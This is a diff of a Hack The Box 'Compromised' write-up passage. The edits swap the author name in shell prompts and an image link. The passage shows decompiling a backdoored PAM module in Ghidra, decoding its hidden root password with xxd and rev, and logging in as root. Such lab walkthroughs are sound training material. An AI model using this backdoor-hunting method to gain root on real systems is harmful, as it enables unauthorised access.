 I opened the file in ghidra and started browsing through the code. Luckily the file was compiled with symbols and strings intact, which made browsing through the code much easier.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-ghidra-backdoor.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-ghidra-backdoor.png)
 
 ```c
   iVar2 = pam_get_user(pamh,&name,0);
@@ -948,10 +949,10 @@ I opened the file in ghidra and started browsing through the code. Luckily the f
 After searching for a long time and questioning whether I was in a rabbit hole, I found what I needed in the `pam_sm_authenticate` function. The c code decompiled by ghidra showed a variable named `backdoor` which stood out to me immediately.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised]
+┌──(kac0㉿kali)-[~/htb/compromised]
 └─$ echo '0x4533557e656b6c7a' | xxd -r 
 E3U~eklz                                                                                                        
-┌──(zweilos㉿kali)-[~/htb/compromised]
+┌──(kac0㉿kali)-[~/htb/compromised]
 └─$ echo '0x2d326d3238766e' | xxd -r
 -2m28vn
 ```
@@ -961,10 +962,10 @@ Based on the code in the assembly view, it looked like these two strings were co
 It didn't work for switching users to root, but when looking at the code I had a thought. It said earlier that the code was little-endian, so...maybe the strings were backwards?
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised]
+┌──(kac0㉿kali)-[~/htb/compromised]
 └─$ echo '0x4533557e656b6c7a' | xxd -r | rev
 zlke~U3E                                                                                                        
-┌──(zweilos㉿kali)-[~/htb/compromised]
+┌──(kac0㉿kali)-[~/htb/compromised]
 └─$ echo '0x2d326d3238766e' | xxd -r | rev  
 nv82m2-
 ```
@@ -990,5 +991,5 @@ And that was it! I was logged in as root.
 
 ```text
 root@compromised:~# cat root.txt 
-5ecd****aec7
+5ecd************************aec7
 ```
